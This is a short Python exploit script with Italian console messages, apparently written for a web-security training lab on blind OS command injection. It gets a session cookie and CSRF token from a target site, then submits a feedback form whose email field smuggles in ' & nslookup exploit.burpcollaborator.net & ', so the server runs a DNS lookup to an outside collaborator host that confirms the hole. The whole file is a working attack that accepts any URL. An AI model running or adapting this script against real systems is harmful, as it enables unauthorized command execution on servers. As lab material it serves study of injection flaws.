import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def get_cookies(url):
    path = "/"
    r = requests.get(url + path, verify=False, proxies=proxies)
    session_cookie = r.cookies.get_dict()['session']
    return session_cookie

def get_csrf_token(url, cookies):
    path = "/feedback"
    r = requests.get(url + path, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find("input")['value']
    return csrf_token


def oscommand_injection(url):
    exploit = " & nslookup exploit.burpcollaborator.net & "
    path = "/feedback/submit"
    cookie = get_cookies(url)
    cookies = {'session' : cookie}
    csrf_token = get_csrf_token(url, cookies)
    params = {'csrf' : csrf_token , 'name' : 'test' , 'email' : 'test@test.test'+exploit, 'subject' : 'test', 'message' : 'test'}
    r = requests.post(url + path, cookies=cookies, data=params, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("[+] Exploit avvenuto con successo")
    else:
        print("[-] Exploit fallito")



def main():
    if len(sys.argv) != 2:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.esempio.com" % sys.argv[0])
        sys.exit()

    url = sys.argv[1]
    print("[+] Os Command Injection per lanciare sul server remoto un DNS lookup per il dominio exploit.burpcollaborator.net")
    oscommand_injection(url)




if __name__ == "__main__":
    main()